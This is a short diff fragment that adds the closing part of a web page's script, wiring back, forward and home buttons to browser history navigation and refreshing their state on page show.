+  
+  backBtn.addEventListener('click', () => window.history.back());
+  forwardBtn.addEventListener('click', () => window.history.forward());
+  homeBtn.addEventListener('click', () => window.location.href = 'index.html');
+  
+  updateNavButtons();
+  
+  // Update on navigation
+  window.addEventListener('pageshow', updateNavButtons);
+});
+</script>
+
+</body></html>
